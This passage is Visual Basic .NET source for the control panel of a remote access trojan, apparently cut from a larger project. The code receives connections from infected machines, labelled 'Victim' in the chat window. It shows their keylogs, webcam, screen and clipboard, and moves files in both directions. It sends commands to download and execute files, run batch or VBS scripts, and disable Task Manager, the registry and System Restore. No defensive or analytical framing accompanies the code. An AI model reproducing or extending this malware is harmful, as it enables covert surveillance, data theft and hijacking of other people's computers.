        While (True)
            Dim c As New Connection(listener.AcceptTcpClient)
            AddHandler c.GotInfo, AddressOf GotInfo
            AddHandler c.Disconnected, AddressOf Disconnected
        End While
    End Sub

    Sub GotInfo(ByVal c As Connection, ByVal info As Data)
        Dim t As New Thread(AddressOf ParseInfo)
        t.IsBackground = True : t.Start(New InfoContainer(c, info))
    End Sub

    Sub ParseInfo(ByVal ic As InfoContainer)
        Dim c As Connection = ic.c : Dim info As Data = ic.d
        Dim Message As String = Encryption.XORDecryption(key, info.GetData)
        Dim cut() As String = Split(Message, "|")
        Try
            Select Case cut(0)
                Case "Connect"
                    If cut(1) <> PasswordTextBox.Text Then
                        RemoveHandler c.GotInfo, AddressOf GotInfo
                        RemoveHandler c.Disconnected, AddressOf Disconnected
                        c.Leave()
                        Exit Sub
                    End If
                    AddClient(c, {cut(2), cut(3), c.IPAddress, cut(4), cut(5), cut(6)})
                Case "MyInfo"
                    Dim t As New Thread(AddressOf NewInfoForm)
                    t.IsBackground = True : t.Start(cut(1) & "|" & cut(2) & "|" & c.IPAddress & "|" & cut(3) & "|" & cut(4) & "|" & cut(5))
                Case "NewID"
                    For Each item As ListViewItem In ConnectionList.Items
                        If DirectCast(item.Tag, Connection).IPAddress = c.IPAddress Then
                            item.SubItems(1).Text = cut(1)
                            Exit For
                        End If
                    Next
                Case "RemoteDesktop"
                    c.remoteDeskForm.DesktopPictureBox.Image = info.GetImage
                Case "AddCam"
                    c.webcamForm.camList.WebcamListView.Items.Add(New ListViewItem With {.Text = cut(1), .ImageIndex = 0})
                Case "RemoteWebcam"
                    c.webcamForm.WebcamPictureBox.Image = info.GetImage
                Case "FileManager"
                    If cut(1) = "Error" Then
                        c.fileManagerForm.UpButton.PerformClick()
                    Else
                        c.fileManagerForm.FileManagerListView.Items.Clear()
                        Dim allFiles As String() = Split(cut(1), "FileManagerSplit")
                        For i = 0 To allFiles.Length - 2 Step 2
                            Dim itm As New ListViewItem({allFiles(i), allFiles(i + 1)})
                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                Dim fsize As Long = CInt(itm.SubItems(1).Text)
                                If fsize > 1073741824 Then
                                    Dim size As Double = fsize / 1073741824
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                ElseIf fsize > 1048576 Then
                                    Dim size As Double = fsize / 1048576
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                ElseIf fsize > 1024 Then
                                    Dim size As Double = fsize / 1024
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                Else
                                    itm.SubItems(1).Text = fsize.ToString & " B"
                                End If
                                itm.Tag = CInt(allFiles(i + 1))
                            End If
                            If itm.Text.StartsWith("[Drive]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(7)
                            ElseIf itm.Text.StartsWith("[CD]") Then
                                itm.ImageIndex = 1
                                itm.Text = itm.Text.Substring(4)
                            ElseIf itm.Text.StartsWith("[Folder]") Then
                                itm.ImageIndex = 2
                                itm.Text = itm.Text.Substring(8)
                            ElseIf itm.Text.EndsWith(".exe") Then
                                itm.ImageIndex = 3
                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".bmp") Then
                                itm.ImageIndex = 4
                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".txt") Then
                                itm.ImageIndex = 5
                            ElseIf itm.Text.EndsWith(".dll") Then
                                itm.ImageIndex = 6
                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".rar") Then
                                itm.ImageIndex = 7
                            Else
                                itm.ImageIndex = 8
                            End If
                            c.fileManagerForm.FileManagerListView.Items.Add(itm)
                        Next
                    End If
                Case "SFileManager"
                    If Not cut(1) = "Error" Then
                        c.fileManagerForm.FileManagerListView.Items.Clear()
                        c.fileManagerForm.LocationTextBox.Text = cut(2) & "\"
                        Dim allFiles As String() = Split(cut(1), "FileManagerSplit")
                        For i = 0 To allFiles.Length - 2 Step 2
                            Dim itm As New ListViewItem({allFiles(i), allFiles(i + 1)})
                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                Dim fsize As Long = CInt(itm.SubItems(1).Text)
                                If fsize > 1073741824 Then
                                    Dim size As Double = fsize / 1073741824
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                ElseIf fsize > 1048576 Then
                                    Dim size As Double = fsize / 1048576
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                ElseIf fsize > 1024 Then
                                    Dim size As Double = fsize / 1024
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                Else
                                    itm.SubItems(1).Text = fsize.ToString & " B"
                                End If
                                itm.Tag = CInt(allFiles(i + 1))
                            End If
                            If itm.Text.StartsWith("[Drive]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(7)
                            ElseIf itm.Text.StartsWith("[CD]") Then
                                itm.ImageIndex = 1
                                itm.Text = itm.Text.Substring(4)
                            ElseIf itm.Text.StartsWith("[Folder]") Then
                                itm.ImageIndex = 2
                                itm.Text = itm.Text.Substring(8)
                            ElseIf itm.Text.EndsWith(".exe") Then
                                itm.ImageIndex = 3
                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".bmp") Then
                                itm.ImageIndex = 4
                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".txt") Then
                                itm.ImageIndex = 5
                            ElseIf itm.Text.EndsWith(".dll") Then
                                itm.ImageIndex = 6
                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".rar") Then
                                itm.ImageIndex = 7
                            Else
                                itm.ImageIndex = 8
                            End If
                            c.fileManagerForm.FileManagerListView.Items.Add(itm)
                        Next
                    End If
                Case "NextPartOfUpload"
                    For Each item As ListViewItem In TransfersListView.Items
                        If item.SubItems(2).Text = "To Server" Then
                            If DirectCast(item.Tag, FileUpload).id = CInt(cut(1)) Then
                                DirectCast(item.Tag, FileUpload).nextPart = True : Exit For
                            End If
                        End If
                    Next
                Case "UploadFailed"
                    For Each item As ListViewItem In TransfersListView.Items
                        If item.SubItems(2).Text = "To Server" Then
                            If DirectCast(item.Tag, FileUpload).id = CInt(cut(1)) Then
                                item.SubItems(5).Text = "Failed" : DirectCast(item.Tag, FileUpload).canceled = True : DirectCast(item.Tag, FileUpload).id = 0 : DirectCast(item.Tag, FileUpload).nextPart = True : Exit For
                            End If
                        End If
                    Next
                Case "RetrievedFile"
                    For Each item As ListViewItem In TransfersListView.Items
                        If item.SubItems(2).Text = "From Server" Then
                            If DirectCast(item.Tag, FileDownload).id = CInt(cut(1)) Then
                                Try
                                    If File.Exists(cut(2)) Then File.Delete(cut(2))
                                    Dim fs As New FileStream(cut(2), FileMode.Create, FileAccess.Write)
                                    'Dim packet(tempPacket.Length - 2) As Byte
                                    'Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                                    'fs.Write(packet, 0, packet.Length) : fs.Close()
                                    fs.Write(info.GetBytes, 0, info.GetBytes.Length) : fs.Close()
                                    item.SubItems(5).Text = cut(3) & "%"
                                    c.Send("NextPartOfDownload|" & cut(1) & "|" & cut(2))
                                Catch
                                    item.SubItems(5).Text = "Failed" : DirectCast(item.Tag, FileDownload).canceled = True : DirectCast(item.Tag, FileDownload).id = 0 : DirectCast(item.Tag, FileDownload).nextPart = True
                                End Try
                                Exit For
                            End If
                        End If
                    Next
                Case "RetrievedContinue"
                    For Each item As ListViewItem In TransfersListView.Items
                        If item.SubItems(2).Text = "From Server" Then
                            If DirectCast(item.Tag, FileDownload).id = CInt(cut(1)) Then
                                Try
A:
                                    stillWritingBytes = True
                                    Dim fs As New FileStream(cut(2), FileMode.Append, FileAccess.Write)
                                    'Dim packet(tempPacket.Length - 2) As Byte
                                    'Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                                    'fs.Write(packet, 0, packet.Length) : fs.Close()
                                    fs.Write(info.GetBytes, 0, info.GetBytes.Length) : fs.Close()
                                    item.SubItems(5).Text = cut(3) & "%"
                                    stillWritingBytes = False
                                    c.Send("NextPartOfDownload|" & cut(1) & "|" & cut(2))
                                Catch
                                    GoTo A
                                End Try
                                Exit Sub
                            End If
                        End If
                    Next
                    c.Send("RetrieveCanceled|" & cut(1))
                    Try
B:
                        File.Delete(cut(2))
                    Catch ex As Exception
                        GoTo B
                    End Try
                Case "RetrievedComplete"
                    For Each item As ListViewItem In TransfersListView.Items
                        If item.SubItems(2).Text = "From Server" Then
                            If DirectCast(item.Tag, FileDownload).id = CInt(cut(1)) Then
                                item.SubItems(4).Text = TimeOfDay : item.SubItems(5).Text = "100%" : DirectCast(item.Tag, FileDownload).canceled = True : DirectCast(item.Tag, FileDownload).id = 0 : DirectCast(item.Tag, FileDownload).nextPart = True
                                Exit For
                            End If
                        End If
                    Next
                Case "RetrieveFailed"
                    For Each item As ListViewItem In TransfersListView.Items
                        If item.SubItems(2).Text = "From Server" Then
                            If DirectCast(item.Tag, FileDownload).id = CInt(cut(1)) Then
                                item.SubItems(5).Text = "Failed" : item.Tag = 0
C:
                                Try
                                    File.Delete(cut(2))
                                Catch
                                    GoTo C
                                End Try
                                Exit For
                            End If
                        End If
                    Next
                Case "ProcessManager"
                    c.processManagerForm.ProcessListView.Items.Clear()
                    Dim allProcess As String() = Split(Message.Substring(15), "ProcessSplit")
                    For i = 0 To allProcess.Length - 2 Step 4
                        Dim itm As New ListViewItem({allProcess(i), allProcess(i + 1), allProcess(i + 2), allProcess(i + 3)}) With {.ImageIndex = 0}
                        If c.processManagerForm.suspendedList.Contains(allProcess(i + 1)) Then
                            itm.BackColor = Color.Red
                        End If
                        c.processManagerForm.ProcessListView.Items.Add(itm)
                    Next
                Case "Keylogs"
                    If c.keystrokeCaptureForm.KeylogTextBox.Text = "" Then
                        If Message.Substring(8).StartsWith(newLine & newLine) Then Message = "Keylogs|" & Message.Substring(108)
                    End If
                    c.keystrokeCaptureForm.KeylogTextBox.Text &= Message.Substring(8).Replace(newLine, vbNewLine)
                Case "Chat"
                    c.chatSystemForm.ChatTextBox.Text += "[" & TimeOfDay & "] Victim: " & vbNewLine & Message.Substring(5) & vbNewLine & vbNewLine
                Case "Clipboard"
                    c.clipboardForm.ClipboardTextBox.Text = Message.Substring(10).Replace(newLine, vbNewLine)
            End Select
        Catch
        End Try
    End Sub

    Sub Disconnected(ByVal c As Connection)
        For Each item As ListViewItem In ConnectionList.Items
            If DirectCast(item.Tag, Connection).IPAddress = c.IPAddress Then
                item.Remove() : ConnectedUsers.Text = ConnectionList.Items.Count.ToString
                If c.infoForm.CanFocus Then c.infoForm.Close()
                If c.remoteDeskForm.CanFocus Then c.remoteDeskForm.Close()
                If c.webcamForm.camList.CanFocus Then c.webcamForm.camList.Close()
                If c.webcamForm.CanFocus Then c.webcamForm.Close()
                If c.fileManagerForm.CanFocus Then c.fileManagerForm.Close()
                If c.processManagerForm.CanFocus Then c.processManagerForm.Close()
                If c.keystrokeCaptureForm.CanFocus Then c.keystrokeCaptureForm.Close()
                If c.chatSystemForm.CanFocus Then c.chatSystemForm.Close()
                If c.clipboardForm.CanFocus Then c.clipboardForm.Close()
                Exit For
            End If
        Next
    End Sub

    Sub AddClient(ByVal c As Connection, ByVal data() As String)
        For Each item As ListViewItem In ConnectionList.Items
            If DirectCast(item.Tag, Connection).IPAddress = c.IPAddress Then
                item.Remove()
            End If
        Next
        Dim lvi As New ListViewItem(data) With {.Tag = c, .ImageKey = data(5).ToLower & ".png"}
        ConnectionList.Items.Add(lvi) ': ShadeListView(ConnectionList)
        ConnectedUsers.Text = ConnectionList.Items.Count.ToString
        If ConnectionList.Items.Count > CInt(Peak.Text) Then Peak.Text = ConnectionList.Items.Count.ToString
        If NotifyCheckBox.Checked Then
            NotifyIcon.BalloonTipText = c.IPAddress & " - " & data(1)
            NotifyIcon.ShowBalloonTip(400)
        End If
        If PlaySoundCheckBox.Checked Then My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Beep)
        For Each item As ListViewItem In OnJoinListView.Items
            If (data(0) = item.Text Or item.Text = "*") And (data(1) = item.SubItems(1).Text Or item.SubItems(1).Text = "*") And (data(3) = item.SubItems(2).Text Or item.SubItems(2).Text = "*") Then
                Select Case item.SubItems(3).Text
                    Case "Change ID"
                        c.Send("ChangeID|" & item.Tag.ToString)
                    Case "Restart Server"
                        c.Send("RestartServer|")
                    Case "Uninstall Server"
                        c.Send("Uninstall|")
                    Case "Close Server"
                        c.Send("Close|")
                    Case "Logoff PC"
                        c.Send("Logoff|")
                    Case "Shutdown PC"
                        c.Send("Shutdown|")
                    Case "Restart PC"
                        c.Send("Restart|")
                    Case "Visit URL"
                        c.Send("VisitURL|" & item.Tag.ToString)
                End Select
            End If
        Next
    End Sub

    Sub Send(ByVal Message As String, Optional ByVal bytes As Byte() = Nothing)
        For Each item As ListViewItem In ConnectionList.SelectedItems
            DirectCast(item.Tag, Connection).Send(Message, bytes)
        Next
        GC.Collect(GC.MaxGeneration)
        GC.WaitForPendingFinalizers()
        cleanmemory(System.Diagnostics.Process.GetCurrentProcess.Handle, &HFFFFFFFFUI, &HFFFFFFFFUI)
    End Sub

    Private Sub FindToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FindToolStripMenuItem.Click
        If Find.ShowDialog = DialogResult.OK Then
            For Each item As ListViewItem In ConnectionList.Items
                item.BackColor = Color.White
                Select Case Find.findIndex
                    Case 0
                        If item.Text.Contains(Find.inputText) Then item.BackColor = Color.Yellow
                    Case Else
                        If item.SubItems(Find.findIndex).Text.Contains(Find.inputText) Then item.BackColor = Color.Yellow
                End Select
            Next
        End If
    End Sub

    Private Sub SelectToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SelectToolStripMenuItem.Click
        If SelectServer.ShowDialog = DialogResult.OK Then
            If SelectServer.fromInt > 0 And ConnectionList.Items.Count >= SelectServer.toInt Then
                ConnectionList.Focus()
                For i = SelectServer.fromInt - 1 To SelectServer.toInt - 1
                    ConnectionList.Items(i).selected = True
                Next
            End If
        End If
    End Sub

    Private Sub FromURLToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromURLToolStripMenuItem.Click
        If Db.ShowDialog = DialogResult.OK Then Send("UpdateFromURL|" & Db.inputText)
    End Sub

    Private Sub FromFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromFileToolStripMenuItem.Click
        Dim ofd As New OpenFileDialog With {.Filter = "Executable Files (*.exe)|*.exe"}
        If ofd.ShowDialog = DialogResult.OK Then Send("UpdateFromFile|", IO.File.ReadAllBytes(ofd.FileName))
    End Sub

    Private Sub ChangeIDToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ChangeIDToolStripMenuItem.Click
        If Db.ShowDialog = DialogResult.OK Then Send("ChangeID|" & Db.inputText)
    End Sub

    Private Sub RestartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem.Click
        Send("RestartServer|")
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem.Click
        Send("Uninstall|")
    End Sub

    Private Sub CloseToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem.Click
        Send("Close|")
    End Sub

    Private Sub LogoffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogoffToolStripMenuItem.Click
        Send("Logoff|")
    End Sub

    Private Sub RestartToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem1.Click
        Send("Restart|")
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click
        Send("Shutdown|")
    End Sub

    Private Sub DesktopToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DesktopToolStripMenuItem.Click
        For Each item As ListViewItem In ConnectionList.SelectedItems
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.remoteDeskForm.CanFocus Then
                c.remoteDeskForm.Activate()
            Else
                c.remoteDeskForm = New RemoteDesktop(c)
                c.Send("StartDesktop|") : c.remoteDeskForm.Text = c.IPAddress & " - " & item.SubItems(1).Text
                Dim t As New Thread(AddressOf ShowRemoteDesktop)
                t.IsBackground = True : t.Start(c)
            End If
        Next
    End Sub

    Private Sub WebcamToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles WebcamToolStripMenuItem.Click
        For Each item As ListViewItem In ConnectionList.SelectedItems
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.webcamForm.camList.CanFocus Then
                c.webcamForm.camList.Activate()
            ElseIf c.webcamForm.CanFocus Then
                c.webcamForm.Activate()
            Else
                c.webcamForm = New Webcam(c)
                c.webcamForm.Text = c.IPAddress & " - " & item.SubItems(1).Text
                Dim t As New Thread(AddressOf ShowWebcam)
                t.IsBackground = True : t.Start(c)
            End If
        Next
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FileManagerToolStripMenuItem.Click
        For Each item As ListViewItem In ConnectionList.SelectedItems
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.fileManagerForm.CanFocus Then
                c.fileManagerForm.Activate()
            Else
                c.fileManagerForm = New FileManager(c)
                c.fileManagerForm.Text = c.IPAddress & " - " & item.SubItems(1).Text
                Dim t As New Thread(AddressOf ShowFileManager)
                t.SetApartmentState(ApartmentState.STA) : t.IsBackground = True : t.Start(c)
            End If
        Next
    End Sub

    Private Sub ProcessManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ProcessManagerToolStripMenuItem.Click
        For Each item As ListViewItem In ConnectionList.SelectedItems
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.processManagerForm.CanFocus Then
                c.processManagerForm.Activate()
            Else
                c.processManagerForm = New ProcessManager(c)
                c.Send("GetProcesses|") : c.processManagerForm.Text = c.IPAddress & " - " & item.SubItems(1).Text
                Dim t As New Thread(AddressOf ShowProcessManager)
                t.IsBackground = True : t.Start(c)
            End If
        Next
    End Sub

    Private Sub KeystrokeCaptureToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KeystrokeCaptureToolStripMenuItem.Click
        For Each item As ListViewItem In ConnectionList.SelectedItems
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.keystrokeCaptureForm.CanFocus Then
                c.keystrokeCaptureForm.Activate()
            Else
                c.keystrokeCaptureForm = New KeystrokeCapture(c)
                c.Send("StartKeystrokeCapture|")
                c.keystrokeCaptureForm.Text = c.IPAddress & " - " & item.SubItems(1).Text
                Dim t As New Thread(AddressOf ShowKeystrokeCapture)
                t.SetApartmentState(ApartmentState.STA) : t.IsBackground = True : t.Start(c)
            End If
        Next
    End Sub

    Private Sub ChatSystemToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ChatSystemToolStripMenuItem.Click
        For Each item As ListViewItem In ConnectionList.SelectedItems
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.chatSystemForm.CanFocus Then
                c.chatSystemForm.Activate()
            Else
                c.chatSystemForm = New ChatSystem(c)
                c.Send("StartChatSystem|") : c.chatSystemForm.Text = c.IPAddress & " - " & item.SubItems(1).Text
                Dim t As New Thread(AddressOf ShowChatSystem)
                t.IsBackground = True : t.Start(c)
            End If
        Next
    End Sub

    Private Sub GetToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GetToolStripMenuItem.Click
        For Each item As ListViewItem In ConnectionList.SelectedItems
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.clipboardForm.CanFocus Then
                c.clipboardForm.Activate()
            Else
                c.clipboardForm = New Clipboard(c)
                c.clipboardForm.ClipboardTextBox.Text = "" : c.Send("GetClipboard|") : c.clipboardForm.Text = c.IPAddress & " - " & item.SubItems(1).Text
                Dim t As New Thread(AddressOf ShowClipboard)
                t.SetApartmentState(ApartmentState.STA) : t.IsBackground = True : t.Start(c)
            End If
        Next
    End Sub

    Private Sub SetToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SetToolStripMenuItem.Click
        If Db.ShowDialog = DialogResult.OK Then Send("SetClipboard|" & Db.inputText)
    End Sub

    Private Sub ClearToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ClearToolStripMenuItem.Click
        Send("ClearClipboard|")
    End Sub

    Private Sub VisitURLToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VisitURLToolStripMenuItem.Click
        If Db.ShowDialog = DialogResult.OK Then Send("VisitURL|" & Db.inputText)
    End Sub

    Private Sub DownloadFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DownloadFileToolStripMenuItem.Click
        If Download.ShowDialog = DialogResult.OK Then Send("Download+Execute|" & Download.downloadLink & "|" & Download.filename)
    End Sub

    Private Sub SendMessageToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendMessageToolStripMenuItem.Click
        If SendMessage.ShowDialog = DialogResult.OK Then Send("Message|" & SendMessage.messageicon & "|" & SendMessage.messagebutton & "|" & SendMessage.title & "|" & SendMessage.message)
    End Sub

    Private Sub BatchToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BatchToolStripMenuItem.Click
        If Script.ShowDialog = DialogResult.OK Then Send("Batch|" & Script.scriptText.Replace(vbNewLine, newLine))
    End Sub

    Private Sub HtmlToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HtmlToolStripMenuItem.Click
        If Script.ShowDialog = DialogResult.OK Then Send("Html|" & Script.scriptText.Replace(vbNewLine, newLine))
    End Sub

    Private Sub VbsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VbsToolStripMenuItem.Click
        If Script.ShowDialog = DialogResult.OK Then Send("Vbs|" & Script.scriptText.Replace(vbNewLine, newLine))
    End Sub

    Private Sub OpenToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpenToolStripMenuItem.Click
        Send("OpenCD|")
    End Sub

    Private Sub CloseToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem1.Click
        Send("CloseCD|")
    End Sub

    Private Sub DisableToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableToolStripMenuItem.Click
        Send("DisableKM|")
    End Sub

    Private Sub EnableToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableToolStripMenuItem.Click
        Send("EnableKM|")
    End Sub

    Private Sub TurnOffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TurnOffToolStripMenuItem.Click
        Send("TurnOffMonitor|")
    End Sub

    Private Sub TurnOnToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TurnOnToolStripMenuItem.Click
        Send("TurnOnMonitor|")
    End Sub

    Private Sub NormalToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NormalToolStripMenuItem.Click
        Send("NormalMouse|")
    End Sub

    Private Sub ReverseToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ReverseToolStripMenuItem.Click
        Send("ReverseMouse|")
    End Sub

    Private Sub HideToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HideToolStripMenuItem.Click
        Send("HideTaskBar|")
    End Sub

    Private Sub ShowToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShowToolStripMenuItem.Click
        Send("ShowTaskBar|")
    End Sub

    Private Sub DisableToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableToolStripMenuItem1.Click
        Send("DisableCMD|")
    End Sub

    Private Sub EnableToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableToolStripMenuItem1.Click
        Send("EnableCMD|")
    End Sub

    Private Sub DisableToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableToolStripMenuItem2.Click
        Send("DisableRegistry|")
    End Sub

    Private Sub EnableToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableToolStripMenuItem2.Click
        Send("EnableRegistry|")
    End Sub

    Private Sub DisableToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableToolStripMenuItem3.Click
        Send("DisableRestore|")
    End Sub

    Private Sub EnableToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableToolStripMenuItem3.Click
        Send("EnableRestore|")
    End Sub

    Private Sub DisableToolStripMenuItem4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisableToolStripMenuItem4.Click
        Send("DisableTaskManager|")
    End Sub

    Private Sub EnableToolStripMenuItem4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableToolStripMenuItem4.Click
        Send("EnableTaskManager|")
    End Sub

    Private Sub TextToSpeechToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextToSpeechToolStripMenuItem.Click
        If Db.ShowDialog = DialogResult.OK Then Send("TextToSpeech|" & Db.inputText)
    End Sub

    Private Sub ConnectionList_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ConnectionList.DoubleClick
        For Each item As ListViewItem In ConnectionList.Items
            Dim c As Connection = DirectCast(item.Tag, Connection)
            If c.infoForm.CanFocus Then
                c.infoForm.Activate()
            Else
                c.Send("GetInfo|")
            End If
        Next
    End Sub

    Sub NewInfoForm(ByVal info As String)
        Dim cut() As String = info.Split("|") : Dim c As Connection
        For Each item As ListViewItem In ConnectionList.Items
            If DirectCast(item.Tag, Connection).IPAddress = cut(2) Then
                c = DirectCast(item.Tag, Connection)
                Exit For
            End If
        Next
        c.infoForm.ComputerNameTextBox.Text = cut(0)
        c.infoForm.CountryTextBox.Text = cut(1)
        c.infoForm.IPTextBox.Text = cut(2)
        c.infoForm.OSTextBox.Text = cut(3)
        c.infoForm.RamTextBox.Text = cut(4) & " Bytes"
        c.infoForm.VersionTextBox.Text = cut(5)
        c.infoForm.ShowDialog()
    End Sub

    Sub ShowRemoteDesktop(ByVal c As Connection)
        c.remoteDeskForm.ShowDialog()
    End Sub

    Sub ShowWebcam(ByVal c As Connection)
        c.webcamForm.ShowDialog()
    End Sub

    Sub ShowFileManager(ByVal c As Connection)
        AddHandler c.fileManagerForm.UploadFile, AddressOf UploadFile
        AddHandler c.fileManagerForm.DownloadFile, AddressOf DownloadFile
        c.fileManagerForm.ShowDialog()
        AddHandler c.fileManagerForm.UploadFile, AddressOf UploadFile
        AddHandler c.fileManagerForm.DownloadFile, AddressOf DownloadFile
    End Sub

    Sub UploadFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String)
        Dim t As New Thread(AddressOf StartUploading)
        t.IsBackground = True : t.Start(New FileUpload(ip, victimLocation, filepath))
    End Sub

    Sub DownloadFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String, ByVal filesize As String)
        Dim t As New Thread(AddressOf StartDownloading)
        t.IsBackground = True : t.Start(New FileDownload(ip, victimLocation, filepath, filesize))
    End Sub

    Sub StartUploading(ByVal u As FileUpload)
        For Each itm As ListViewItem In ConnectionList.Items
            If DirectCast(itm.Tag, Connection).IPAddress = u.ip Then
                Dim percentage As Integer = 0
                Dim currentAmount As Integer = 0
                Dim f As New IO.FileInfo(u.filepath)
                Dim item As New ListViewItem({IO.Path.GetFileName(u.filepath), f.Length.ToString & " byte(s)", "To Server", TimeOfDay, "N/A", percentage & "%"}) With {.Tag = u}
                TransfersListView.Items.Add(item)
                Dim remainder As Long = f.Length Mod 100
                Dim sizeOfParts As Long = ((f.Length - remainder) / 100)
                Dim packet(sizeOfParts - 1) As Byte
                Dim fs As New FileStream(u.filepath, FileMode.Open, FileAccess.Read)
                Dim tempBytesRead As Integer = fs.Read(packet, 0, sizeOfParts)
                DirectCast(itm.Tag, Connection).Send("Upload|" & u.victimLocation & IO.Path.GetFileName(u.filepath) & "|" & u.id, packet)
                currentAmount += tempBytesRead : percentage = Math.Round(currentAmount / f.Length * 100)
                For Each fileInProgress As ListViewItem In TransfersListView.Items
                    If fileInProgress.SubItems(2).Text = "To Server" Then
                        If DirectCast(fileInProgress.Tag, FileUpload).id = u.id Then
                            Do
                                Do Until DirectCast(fileInProgress.Tag, FileUpload).nextPart
                                    Application.DoEvents()
                                Loop
                                If DirectCast(fileInProgress.Tag, FileUpload).canceled Then
                                    DirectCast(itm.Tag, Connection).Send("CancelUpload|" & u.victimLocation & IO.Path.GetFileName(u.filepath))
                                    Exit Sub
                                End If
                                fileInProgress.SubItems(5).Text = percentage & "%"
